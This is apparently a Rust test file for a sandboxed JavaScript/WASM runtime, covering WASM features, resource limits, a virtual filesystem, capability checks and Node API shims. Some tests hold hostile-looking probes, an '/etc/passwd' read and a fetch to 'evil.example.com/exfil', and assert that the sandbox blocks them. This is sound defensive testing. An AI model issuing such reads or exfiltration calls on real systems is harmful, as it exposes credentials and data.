#![allow(unused_imports)]
use crate::intrinsics::{
    Sha256State, digest_to_hex, fast_format_bytes, fast_format_ms, fast_parse_bytes, fast_parse_ms,
    hmac_sha256_hex, sha256_hex,
};
use crate::{
    ExecutionTier, HttpRequestContext, JsValue, SliceIsolate, compile_source_to_bytecode,
    disassemble_bytecode, run_source_isolated,
};
use slice_sandbox::{CapabilityToken, SandboxViolation};

#[test]
fn test_wave_d_wasm_compile_instantiate_memory_globals_and_host_imports() {
    let script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const body = (bytes) => [bytes.length, ...bytes];

        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
            // Custom section (id 0): name "slice_meta" + payload "SLC"
            ...sec(0x00, [...str("slice_meta"), 0x53, 0x4C, 0x43]),
            // Type section (id 1): 2 types
            ...sec(0x01, [
                0x02,
                0x60, 0x02, 0x7F, 0x7F, 0x01, 0x7F, // Type 0: (i32, i32) -> i32
                0x60, 0x01, 0x7E, 0x01, 0x7E        // Type 1: (i64) -> i64
            ]),
            // Import section (id 2): 1 import: "env"."host_scale" -> func type 0
            ...sec(0x02, [
                0x01,
                ...str("env"),
                ...str("host_scale"),
                0x00, 0x00
            ]),
            // Function section (id 3): 2 functions (type 0, type 1)
            ...sec(0x03, [0x02, 0x00, 0x01]),
            // Memory section (id 5): 1 memory (limits: flags=1, min=1, max=4)
            ...sec(0x05, [0x01, 0x01, 0x01, 0x04]),
            // Global section (id 6): 1 mutable i32 global = 100
            ...sec(0x06, [0x01, 0x7F, 0x01, 0x41, 0xE4, 0x00, 0x0B]),
            // Export section (id 7): 4 exports
            ...sec(0x07, [
                0x04,
                ...str("memory"), 0x02, 0x00,
                ...str("counter"), 0x03, 0x00,
                ...str("compute_and_xor"), 0x00, 0x01,
                ...str("mix64"), 0x00, 0x02
            ]),
            // Code section (id 10): 2 function bodies
            ...sec(0x0A, [
                0x02,
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x20, 0x00, 0x20, 0x01, 0x10, 0x00,
                    0x6A,
                    0x23, 0x00,
                    0x6A,
                    0x36, 0x02, 0x00,
                    0x23, 0x00, 0x41, 0x05, 0x6A, 0x24, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x0B
                ]),
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00, 0x42, 0x07, 0x7E, 0x42, 0x03, 0x7C,
                    0x0B
                ])
            ])
        ]);

        const valid = WebAssembly.validate(wasmBytes);
        const mod = new WebAssembly.Module(wasmBytes);
        const exportsMeta = WebAssembly.Module.exports(mod);
        const importsMeta = WebAssembly.Module.imports(mod);
        const customSecs = WebAssembly.Module.customSections(mod, "slice_meta");
        const customText = new TextDecoder().decode(new Uint8Array(customSecs[0]));

        let hostCallCount = 0;
        const importObj = {
            env: {
                host_scale(ptr, len) {
                    hostCallCount++;
                    return (ptr + len) * 3;
                }
            }
        };

        const inst1 = new WebAssembly.Instance(mod, importObj);
        const memView = new Int32Array(inst1.exports.memory.buffer);
        memView[4] = 1000; // byte offset 16

        // Call compute_and_xor(16, 4):
        // mem[16] = 1000 + host_scale(16, 4) [60] + counter [100] = 1160
        // counter becomes 105
        const res1 = inst1.exports.compute_and_xor(16, 4);
        const memAfter = new Int32Array(inst1.exports.memory.buffer)[4];
        const counterAfter = inst1.exports.counter.value;
        inst1.exports.counter.value = 200;
        const res2 = inst1.exports.compute_and_xor(16, 4); // 1160 + 60 + 200 = 1420

        // Test memory.grow(1) and verify existing data is preserved
        const prevPages = inst1.exports.memory.grow(1);
        const grownBytes = inst1.exports.memory.buffer.byteLength;
        const preservedWord = new Int32Array(inst1.exports.memory.buffer)[4];

        // Test i64 BigInt roundtrip
        const mix64Res = inst1.exports.mix64(10n);

        // Test standalone WebAssembly.Global & WebAssembly.Table & async WebAssembly.instantiate
        const standaloneGlobal = new WebAssembly.Global({ value: "i32", mutable: true }, 42);
        standaloneGlobal.value = 99;
        const table = new WebAssembly.Table({ element: "anyfunc", initial: 2, maximum: 4 });
        const prevTableLen = table.grow(1);

        WebAssembly.instantiate(wasmBytes, importObj).then(({ module, instance }) => {
            console.log(JSON.stringify({
                valid,
                exportsCount: exportsMeta.length,
                importsCount: importsMeta.length,
                customText,
                hostCallCount,
                res1,
                memAfter,
                counterAfter,
                res2,
                prevPages,
                grownBytes,
                preservedWord,
                mix64Res: String(mix64Res),
                standaloneGlobal: standaloneGlobal.value,
                prevTableLen,
                tableLen: table.length,
                asyncInstOk: typeof instance.exports.compute_and_xor === "function"
            }));
        });
    "#;

    let m = run_source_isolated(
        "wave-d-wasm-full",
        script,
        CapabilityToken::pure_compute(),
        5_000_000,
        32 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"valid":true,"exportsCount":4,"importsCount":1,"customText":"SLC","hostCallCount":2,"res1":1160,"memAfter":1160,"counterAfter":105,"res2":1420,"prevPages":1,"grownBytes":131072,"preservedWord":1420,"mix64Res":"73","standaloneGlobal":99,"prevTableLen":2,"tableLen":3,"asyncInstOk":true}"#
    );
    assert!(
        crate::wasm::wasm_module_cache_hits() >= 1,
        "Expected GLOBAL_WASM_MODULE_CACHE to record at least 1 warm hit"
    );
}

#[test]
fn test_wave_d_wasm_5_ring_security_fuel_bomb_and_memory_cage() {
    // 1. Ring 1 (Invalid Magic Header -> CompileError) & Ring 4 (Missing Host Import -> LinkError)
    {
        let script = r#"
            const invalidBytes = new Uint8Array([0x00, 0x01, 0x02, 0x03]);
            const isValid = WebAssembly.validate(invalidBytes);
            let compileErrOk = false;
            try {
                new WebAssembly.Module(invalidBytes);
            } catch (e) {
                compileErrOk = e instanceof WebAssembly.CompileError;
            }

            // Minimal module importing env.missing1
            const importModBytes = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x02, 0x10, 0x01, 0x03, 0x65, 0x6E, 0x76, 0x08, 0x6D, 0x69, 0x73, 0x73, 0x69, 0x6E, 0x67, 0x31, 0x00, 0x00
            ]);
            let linkErrOk = false;
            try {
                const m = new WebAssembly.Module(importModBytes);
                new WebAssembly.Instance(m, {});
            } catch (e) {
                linkErrOk = e instanceof WebAssembly.LinkError;
            }
            console.log(JSON.stringify({ isValid, compileErrOk, linkErrOk }));
        "#;
        let m = run_source_isolated(
            "wave-d-wasm-errors",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            16 * 1024 * 1024,
        )
        .unwrap();
        assert_eq!(
            m.stdout[0],
            r#"{"isValid":false,"compileErrOk":true,"linkErrOk":true}"#
        );
    }

    // 2. Ring 2: Infinite WASM Loop `(loop (br 0))` deterministically trapped by shared CPU Fuel Meter
    {
        let script = r#"
            const spinWasm = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
                0x03, 0x02, 0x01, 0x00,
                0x07, 0x08, 0x01, 0x04, 0x73, 0x70, 0x69, 0x6E, 0x00, 0x00,
                0x0A, 0x09, 0x01, 0x07, 0x00, 0x03, 0x40, 0x0C, 0x00, 0x0B, 0x0B
            ]);
            const mod = new WebAssembly.Module(spinWasm);
            const inst = new WebAssembly.Instance(mod);
            inst.exports.spin();
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-fuel-bomb",
            script,
            CapabilityToken::pure_compute(),
            25_000,
            16 * 1024 * 1024,
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::CpuFuelExhausted { .. })
            ),
            "Expected SandboxViolation::CpuFuelExhausted on infinite WASM loop, got {:?}",
            err
        );
    }

    // 3. Ring 3: WASM Linear Memory Bomb exceeding tenant memory ceiling deterministically trapped
    {
        let script = r#"
            // Request 32 pages (2 MB) > 512 KB tenant ceiling
            const mem = new WebAssembly.Memory({ initial: 32 });
        "#;
        let err = run_source_isolated(
            "wave-d-wasm-mem-bomb",
            script,
            CapabilityToken::pure_compute(),
            500_000,
            512 * 1024, // 512 KB tenant ceiling
        )
        .unwrap_err();
        assert!(
            matches!(
                err.downcast_ref::<SandboxViolation>(),
                Some(SandboxViolation::MemoryCeilingExceeded { .. })
            ),
            "Expected SandboxViolation::MemoryCeilingExceeded on oversized WASM memory, got {:?}",
            err
        );
    }
}

#[test]
fn test_wave_g_binary_vfs_roundtrip_eval_sandbox_ocap_and_bounded_fetch_concurrency() {
    // 1. Binary VFS (`BOA_VFS_CACHE: FxHashMap<String, Vec<u8>>`) + Checkpoint/Restore without UTF-8 lossy corruption
    let vfs_script = r#"
import * as fs from "node:fs";

const nonUtf8 = new Uint8Array([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28]);
fs.writeFileSync("/workspace/raw.bin", nonUtf8);
fs.appendFileSync("/workspace/raw.bin", Buffer.from([0xde, 0xad]));

const snap = Slice.checkpoint();
fs.writeFileSync("/workspace/raw.bin", "corrupted-overwrite");
Slice.restore(snap);

const readBuf = fs.readFileSync("/workspace/raw.bin", null);
const readHex = fs.readFileSync("/workspace/raw.bin", "hex");
const st = fs.statSync("/workspace/raw.bin");

// Also verify Slice.evalSandbox blocks capability escalation when parent has only /workspace read/write
const escFs = Slice.evalSandbox("const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');", {
    allowRead: ["/etc"]
});
const escNet = Slice.evalSandbox("fetch('https://evil.example.com/exfil');", {
    allowNet: ["evil.example.com"]
});

console.log(JSON.stringify({
    bytes: Array.from(readBuf),
    hex: readHex,
    size: st.size,
    mtimeReal: st.mtimeMs !== 1700000000000 && st.mtimeMs > 1700000000000,
    escFsBlocked: escFs.ok === false && String(escFs.violation).includes("lacks filesystem read authority"),
    escNetBlocked: escNet.ok === false && String(escNet.violation).includes("lacks outbound network authority")
}));
"#;

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let m = run_source_isolated(
        "wave-g-binary-vfs",
        vfs_script,
        caps,
        1_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-binary-vfs execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(
        parsed["bytes"],
        serde_json::json!([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28, 0xde, 0xad]),
        "Binary VFS must preserve arbitrary non-UTF-8 bytes across writeFileSync/appendFileSync/checkpoint/restore"
    );
    assert_eq!(parsed["hex"], "fffe0080c328dead");
    assert_eq!(parsed["size"], 8);
    assert_eq!(parsed["mtimeReal"], true);
    assert_eq!(parsed["escFsBlocked"], true);
    assert_eq!(parsed["escNetBlocked"], true);

    // 2. Direct Rust `SliceIsolate::eval_sandbox` on a `pure_compute()` parent must block child escalation
    let mut pure_parent = SliceIsolate::spawn(
        "wave-g-pure-parent",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        8 * 1024 * 1024,
    );
    let outcome_fs = pure_parent.eval_sandbox(
        "const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');",
        crate::SandboxEvalOptions {
            allow_read: vec!["/etc".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_fs.ok
            && outcome_fs
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks filesystem read authority"),
        "pure_compute() parent must never allow child allow_read escalation: {:?}",
        outcome_fs
    );

    let outcome_net = pure_parent.eval_sandbox(
        "fetch('https://evil.example.com/exfil');",
        crate::SandboxEvalOptions {
            allow_net: vec!["evil.example.com".to_string()],
            ..Default::default()
        },
    );
    assert!(
        !outcome_net.ok
            && outcome_net
                .violation
                .as_deref()
                .unwrap_or("")
                .contains("lacks outbound network authority"),
        "pure_compute() parent must never allow child allow_net escalation: {:?}",
        outcome_net
    );

    // 3. Concurrent `Promise.all` fetch batching > 16 requests bounded by `MAX_CONCURRENT_FETCHES = 16`
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let server_handle = std::thread::spawn(move || {
        for _ in 0..24 {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let n = stream.read(&mut buf).unwrap_or(0);
                let req_str = String::from_utf8_lossy(&buf[..n]);
                let id = req_str
                    .lines()
                    .next()
                    .and_then(|l| l.split_whitespace().nth(1))
                    .unwrap_or("/0")
                    .trim_start_matches('/');
                let body = format!("ok-{}", id);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        }
    });

    let batch_script = format!(
        r#"
(async () => {{
    const urls = [];
    for (let i = 0; i < 24; i++) {{
        urls.push("http://127.0.0.1:{port}/" + i);
    }}
    const responses = await Promise.all(urls.map((u) => fetch(u).then((r) => r.text())));
    console.log(JSON.stringify({{ count: responses.length, first: responses[0], last: responses[23] }}));
}})();
"#,
        port = port
    );
    let fetch_caps = CapabilityToken::pure_compute().with_net_host("127.0.0.1");
    let fm = run_source_isolated(
        "wave-g-bounded-fetch",
        &batch_script,
        fetch_caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave-g-bounded-fetch execution");
    let _ = server_handle.join();
    let f_out: serde_json::Value = serde_json::from_str(&fm.stdout[0]).unwrap();
    assert_eq!(f_out["count"], 24);
    assert_eq!(f_out["first"], "ok-0");
    assert_eq!(f_out["last"], "ok-23");
}

#[test]
fn test_wave_h_lazy_host_binding_gating_on_cold_realm_and_on_demand_activation() {
    // 1. Fresh cold `WarmBoaRealm` must NOT eagerly register HTTP bridge, KV/sandbox, or SemVer/fast-ms host bindings
    let mut cold_realm = crate::boa_realm::create_warm_boa_realm();
    let global = cold_realm.ctx.global_object();
    for deferred_binding in [
        "__slice_http_method",
        "__slice_http_respond",
        "__slice_kv_get",
        "__slice_eval_sandbox",
        "__slice_semver_valid",
        "__slice_fast_ms",
        "__slice_btoa",
    ] {
        assert!(
            !global
                .has_own_property(
                    boa_engine::JsString::from(deferred_binding),
                    &mut cold_realm.ctx
                )
                .unwrap_or(true),
            "Cold WarmBoaRealm should NOT eagerly register {}",
            deferred_binding
        );
    }

    // 2. When a script uses `Slice.kv`, `Slice.evalSandbox`, `btoa`, and `slice:semver`, those host bindings are registered on demand
    let script = r#"
import semver from "slice:semver";
Slice.kv.set("wave-h-key", "active-val");
const kvVal = Slice.kv.get("wave-h-key");
const b64 = btoa("wave-h");
const svOk = semver.satisfies("2.5.0", ">=2.0.0 <3.0.0");
const sb = Slice.evalSandbox("19 + 23", { fuelLimit: 10000 });
console.log(JSON.stringify({ kvVal, b64, svOk, sbVal: sb.returnValue }));
"#;
    let m = run_source_isolated(
        "wave-h-lazy-bindings",
        script,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-h-lazy-bindings execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["kvVal"], "active-val");
    assert_eq!(parsed["b64"], "d2F2ZS1o");
    assert_eq!(parsed["svOk"], true);
    assert_eq!(parsed["sbVal"], "42");
}

#[test]
fn test_wave_i_end_to_end_aliases_import_meta_dynamic_import_and_node_url() {
    let test_dir = std::env::temp_dir().join("slice_wave_i_engine_e2e_test");
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(test_dir.join("src/services")).unwrap();
    std::fs::create_dir_all(test_dir.join("src/internal")).unwrap();

    std::fs::write(
        test_dir.join("tsconfig.json"),
        r#"{
  // Wave I tsconfig paths with JSONC comments
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@/*": ["./src/*"],
    },
  },
}"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("package.json"),
        r##"{
  "name": "wave-i-e2e",
  "imports": {
    "#internal/*": "./src/internal/*.ts"
  }
}"##,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/internal/token.ts"),
        r#"export const SECRET_PREFIX = "tok_wave_i";
"#,
    )
    .unwrap();

    std::fs::write(
        test_dir.join("src/services/plugin.ts"),
        r##"import { SECRET_PREFIX } from "#internal/token";
export function runPlugin(id: number): string {
  return `${SECRET_PREFIX}_${id}`;
}
"##,
    )
    .unwrap();

    let entry_path = test_dir.join("src/index.ts");
    std::fs::write(
        &entry_path,
        r#"import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const mod = await import("@/services/plugin");
const fromMeta = fileURLToPath(import.meta.url);
const roundtripHref = pathToFileURL(__filename).href;
console.log(JSON.stringify({
  pluginOut: mod.runPlugin(99),
  sameFile: fromMeta === __filename && import.meta.filename === __filename,
  sameDir: path.dirname(fromMeta) === __dirname && import.meta.dirname === __dirname,
  sameUrl: roundtripHref === import.meta.url,
}));
"#,
    )
    .unwrap();

    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle_entrypoint_with_deps");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-i-e2e",
        &bundled,
        CapabilityToken::pure_compute(),
        500_000,
        8 * 1024 * 1024,
    )
    .expect("wave-i-e2e execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
    assert_eq!(parsed["pluginOut"], "tok_wave_i_99");
    assert_eq!(parsed["sameFile"], true);
    assert_eq!(parsed["sameDir"], true);
    assert_eq!(parsed["sameUrl"], true);
}

#[test]
fn test_wave_j_async_local_storage_compression_streams_zlib_and_url_pattern() {
    let script = r#"
import { AsyncLocalStorage, AsyncResource } from "node:async_hooks";
import zlib from "node:zlib";
import { promisify } from "node:util";

async function runWaveJ() {
  // 1. AsyncLocalStorage across concurrent Promise.all, setTimeout, queueMicrotask, nextTick, exit, snapshot, AsyncResource
  const reqStore = new AsyncLocalStorage();
  const traceStore = new AsyncLocalStorage();

  const [resA, resB] = await Promise.all([
    reqStore.run({ reqId: "req-alpha" }, async () => {
      await Promise.resolve();
      const s1 = reqStore.getStore().reqId;
      await new Promise((r) => setTimeout(r, 8));
      const s2 = reqStore.getStore().reqId;
      const nested = await traceStore.run({ span: "span-1" }, async () => {
        await new Promise((r) => queueMicrotask(r));
        return `${reqStore.getStore().reqId}:${traceStore.getStore().span}`;
      });
      const exited = reqStore.exit(() => reqStore.getStore());
      return { s1, s2, nested, exitedIsUndefined: exited === undefined, afterExit: reqStore.getStore().reqId };
    }),
    reqStore.run({ reqId: "req-beta" }, async () => {
      await new Promise((r) => setTimeout(r, 2));
      const s1 = reqStore.getStore().reqId;
      const fromNextTick = await new Promise((r) => process.nextTick(() => r(reqStore.getStore().reqId)));
      return { s1, fromNextTick };
    }),
  ]);

  let snapResult = "";
  let resourceResult = "";
  reqStore.run({ reqId: "req-snap" }, () => {
    const runInSnap = AsyncLocalStorage.snapshot();
    const ar = new AsyncResource("CustomPool");
    reqStore.run({ reqId: "req-overridden" }, () => {
      snapResult = runInSnap(() => reqStore.getStore().reqId);
      resourceResult = ar.runInAsyncScope(() => reqStore.getStore().reqId);
    });
  });

  // 2. CompressionStream / DecompressionStream ("gzip", "deflate", "deflate-raw") + node:zlib
  const payload = "Slice WinterTC Edge Compression & Decompression Stream Verification! ".repeat(20);
  const streamFormats = ["gzip", "deflate", "deflate-raw"];
  const streamResults = {};
  for (const fmt of streamFormats) {
    const cs = new CompressionStream(fmt);
    const compressedStream = new Blob([payload]).stream().pipeThrough(cs);
    const compressedBytes = new Uint8Array(await new Response(compressedStream).arrayBuffer());
    const ds = new DecompressionStream(fmt);
    const decompressedStream = new Blob([compressedBytes]).stream().pipeThrough(ds);
    const roundtripText = await new Response(decompressedStream).text();
    streamResults[fmt] = {
      compressedSmaller: compressedBytes.byteLength < payload.length,
      matches: roundtripText === payload,
    };
  }

  const gzBuf = zlib.gzipSync(payload);
  const gunzStr = zlib.gunzipSync(gzBuf).toString("utf8");
  const defBuf = zlib.deflateSync(payload);
  const infStr = zlib.inflateSync(defBuf).toString("utf8");
  const rawBuf = zlib.deflateRawSync(payload);
  const infRawStr = zlib.inflateRawSync(rawBuf).toString("utf8");
  const unzipAutoGz = zlib.unzipSync(gzBuf).toString("utf8");
  const unzipAutoDef = zlib.unzipSync(defBuf).toString("utf8");
  const gzipAsync = promisify(zlib.gzip);
  const gunzipAsync = promisify(zlib.gunzip);
  const asyncRoundtrip = (await gunzipAsync(await gzipAsync("async-zlib-ok"))).toString("utf8");

  // 3. URLPattern global routing primitive
  const p1 = new URLPattern("https://api.example.com/v1/users/:id/posts/:postId?");
  const m1 = p1.exec("https://api.example.com/v1/users/42/posts/99?sort=asc#top");
  const m2 = p1.exec("https://api.example.com/v1/users/42/posts");
  const p2 = new URLPattern({ pathname: "/files/:dir+/download/*" });
  const m3 = p2.exec("https://cdn.example.com/files/a/b/c/download/report.pdf");
  const p3 = new URLPattern("/items/:id(\\d+)", "https://shop.example.com");

  console.log(JSON.stringify({
    als: {
      resA,
      resB,
      snapResult,
      resourceResult,
      outsideIsUndefined: reqStore.getStore() === undefined,
    },
    compression: {
      streamResults,
      zlibOk:
        gunzStr === payload &&
        infStr === payload &&
        infRawStr === payload &&
        unzipAutoGz === payload &&
        unzipAutoDef === payload &&
        asyncRoundtrip === "async-zlib-ok",
    },
    urlPattern: {
      m1Id: m1.pathname.groups.id,
      m1PostId: m1.pathname.groups.postId,
      m2Id: m2.pathname.groups.id,
      m2PostIdUndefined: m2.pathname.groups.postId === undefined,
      m3Dir: m3.pathname.groups.dir,
      m3Wild: m3.pathname.groups["0"],
      p3NumericMatch: p3.test("https://shop.example.com/items/12345"),
      p3AlphaReject: !p3.test("https://shop.example.com/items/abc"),
      p3HasRegExp: p3.hasRegExpGroups,
    },
  }));
}
runWaveJ().catch((e) => console.log(JSON.stringify({ __err: String(e && e.stack || e) })));
"#;

    let test_dir = std::env::temp_dir().join(format!("slice_wave_j_test_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.ts");
    std::fs::write(&entry_path, script).unwrap();
    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle wave j script");
    let _ = std::fs::remove_dir_all(&test_dir);

    let m = run_source_isolated(
        "wave-j-tenant",
        &bundled,
        CapabilityToken::pure_compute(),
        800_000,
        16 * 1024 * 1024,
    )
    .expect("wave-j execution");
    let out: serde_json::Value = serde_json::from_str(&m.stdout[0]).expect("parse wave-j json");
    assert!(out.get("__err").is_none(), "wave-j error: {}", out);

    assert_eq!(out["als"]["resA"]["s1"], "req-alpha");
    assert_eq!(out["als"]["resA"]["s2"], "req-alpha");
    assert_eq!(out["als"]["resA"]["nested"], "req-alpha:span-1");
    assert_eq!(out["als"]["resA"]["exitedIsUndefined"], true);
    assert_eq!(out["als"]["resA"]["afterExit"], "req-alpha");
    assert_eq!(out["als"]["resB"]["s1"], "req-beta");
    assert_eq!(out["als"]["resB"]["fromNextTick"], "req-beta");
    assert_eq!(out["als"]["snapResult"], "req-snap");
    assert_eq!(out["als"]["resourceResult"], "req-snap");
    assert_eq!(out["als"]["outsideIsUndefined"], true);

    for fmt in ["gzip", "deflate", "deflate-raw"] {
        assert_eq!(
            out["compression"]["streamResults"][fmt]["compressedSmaller"],
            true
        );
        assert_eq!(out["compression"]["streamResults"][fmt]["matches"], true);
    }
    assert_eq!(out["compression"]["zlibOk"], true);

    assert_eq!(out["urlPattern"]["m1Id"], "42");
    assert_eq!(out["urlPattern"]["m1PostId"], "99");
    assert_eq!(out["urlPattern"]["m2Id"], "42");
    assert_eq!(out["urlPattern"]["m2PostIdUndefined"], true);
    assert_eq!(out["urlPattern"]["m3Dir"], "a/b/c");
    assert_eq!(out["urlPattern"]["m3Wild"], "report.pdf");
    assert_eq!(out["urlPattern"]["p3NumericMatch"], true);
    assert_eq!(out["urlPattern"]["p3AlphaReject"], true);
    assert_eq!(out["urlPattern"]["p3HasRegExp"], true);
}

#[test]
fn test_issues_28_31_33_37_fs_readline_json_fastpath_and_uncaught_source_map() {
    use slice_sandbox::CapabilityToken;

    let script = r#"
import fs from "node:fs";
import fsp from "node:fs/promises";
import readline from "node:readline";
import readlinePromises from "node:readline/promises";
import { PassThrough } from "node:stream";
import v8 from "node:v8";
import cluster from "node:cluster";
import http2 from "node:http2";
import { WASI } from "node:wasi";

async function runAuditSuite() {
  // 1. Issue #28: node:fs cpSync, truncateSync, utimesSync, readlinkSync, watch
  fs.mkdirSync("/app/src_dir/nested", { recursive: true });
  fs.writeFileSync("/app/src_dir/nested/hello.txt", "hello-world-12345");
  fs.cpSync("/app/src_dir", "/app/dst_dir", { recursive: true });
  const copiedText = fs.readFileSync("/app/dst_dir/nested/hello.txt", "utf8");
  fs.truncateSync("/app/dst_dir/nested/hello.txt", 5);
  const truncatedText = fs.readFileSync("/app/dst_dir/nested/hello.txt", "utf8");
  fs.utimesSync("/app/dst_dir/nested/hello.txt", 1700000000, 1700000000);
  fs.symlinkSync("/app/dst_dir/nested/hello.txt", "/app/dst_dir/link.txt");
  const linkTarget = fs.readlinkSync("/app/dst_dir/link.txt");

  let watchEvents: string[] = [];
  const watcher = fs.watch("/app/dst_dir/nested/hello.txt", (evt, filename) => {
    watchEvents.push(evt + ":" + filename);
  });
  fs.writeFileSync("/app/dst_dir/nested/hello.txt", "updated!");
  watcher.close();

  await fsp.cp("/app/dst_dir/nested/hello.txt", "/app/dst_dir/async_copy.txt");
  await fsp.truncate("/app/dst_dir/async_copy.txt", 4);
  const asyncTrunc = await fsp.readFile("/app/dst_dir/async_copy.txt", "utf8");

  // 2. Issue #31: node:readline & node:readline/promises + core shims
  const input1 = new PassThrough();
  const rl1 = readline.createInterface({ input: input1 });
  const lines1: string[] = [];
  rl1.on("line", (l: string) => lines1.push(l));
  input1.end("alpha\nbeta\ngamma\n");
  await new Promise((r) => setTimeout(r, 5));

  const input2 = new PassThrough();
  const rl2 = readlinePromises.createInterface({ input: input2 });
  const qPromise = rl2.question("Prompt> ");
  input2.write("answer-42\n");
  const qAnswer = await qPromise;
  rl2.close();

  const heapStats = v8.getHeapStatistics();
  const wasiInst = new WASI({ args: ["app"] });

  // 3. Issue #37: JSON.stringify fast path & sub-ms performance.now()
  const t0 = performance.now();
  const complexObj = {
    id: 101,
    active: true,
    nil: null,
    undef: undefined,
    fnVal: () => 1,
    symVal: Symbol("skip"),
    text: "quote\"backslash\\newline\ntab\tctrl\x01",
    ints: [1, 2, -3, 0, 42],
    floats: [1.5, -0.25, 3.125],
    mixed: ["a", undefined, () => {}, null, { k: "v" }],
    customToJson: {
      toJSON() {
        return "custom-to-json-ok";
      },
    },
  };
  const jsonFast = JSON.stringify(complexObj);
  const jsonPretty = JSON.stringify({ a: 1 }, null, 2);
  let cyclicThrew = false;
  const cyc: any = { a: 1 };
  cyc.self = cyc;
  try {
    JSON.stringify(cyc);
  } catch (e: any) {
    cyclicThrew = e instanceof TypeError;
  }
  const t1 = performance.now();

  console.log(JSON.stringify({
    fs: {
      copiedText,
      truncatedText,
      linkTarget,
      watchEvents,
      asyncTrunc,
    },
    readline: {
      lines1,
      qAnswer,
      v8Ok: typeof heapStats.total_heap_size === "number",
      clusterPrimary: cluster.isPrimary,
      http2StatusOk: http2.constants.HTTP_STATUS_OK === 200,
      wasiOk: typeof wasiInst.wasiImport.proc_exit === "function",
    },
    json: {
      parsedFast: JSON.parse(jsonFast),
      prettyHasNewline: jsonPretty.includes("\n  \"a\": 1"),
      cyclicThrew,
      perfDeltaValid: t1 >= t0,
    },
  }));
}
runAuditSuite().catch((e) => console.log(JSON.stringify({ __err: String(e && e.stack || e) })));
"#;

    let test_dir =
        std::env::temp_dir().join(format!("slice_issues_audit_test_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.ts");
    std::fs::write(&entry_path, script).unwrap();
    let bundled =
        slice_cas::bundle_entrypoint_with_deps(&entry_path).expect("bundle audit suite script");
    let _ = std::fs::remove_dir_all(&test_dir);

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/app")
        .with_write_prefix("/app");
    let m = run_source_isolated(
        "issues-audit-tenant",
        &bundled,
        caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .expect("issues-audit execution");
    let out: serde_json::Value = serde_json::from_str(&m.stdout[0]).expect("parse audit json");
    assert!(out.get("__err").is_none(), "audit suite error: {}", out);

    assert_eq!(out["fs"]["copiedText"], "hello-world-12345");
    assert_eq!(out["fs"]["truncatedText"], "hello");
    assert_eq!(out["fs"]["linkTarget"], "/app/dst_dir/nested/hello.txt");
    assert_eq!(out["fs"]["watchEvents"][0], "change:hello.txt");
    assert_eq!(out["fs"]["asyncTrunc"], "upda");

    assert_eq!(
        out["readline"]["lines1"],
        serde_json::json!(["alpha", "beta", "gamma"])
    );
    assert_eq!(out["readline"]["qAnswer"], "answer-42");
    assert_eq!(out["readline"]["v8Ok"], true);
    assert_eq!(out["readline"]["clusterPrimary"], true);
    assert_eq!(out["readline"]["http2StatusOk"], true);
    assert_eq!(out["readline"]["wasiOk"], true);

    assert_eq!(out["json"]["parsedFast"]["id"], 101);
    assert_eq!(
        out["json"]["parsedFast"]["text"],
        "quote\"backslash\\newline\ntab\tctrl\x01"
    );
    assert_eq!(
        out["json"]["parsedFast"]["ints"],
        serde_json::json!([1, 2, -3, 0, 42])
    );
    assert_eq!(
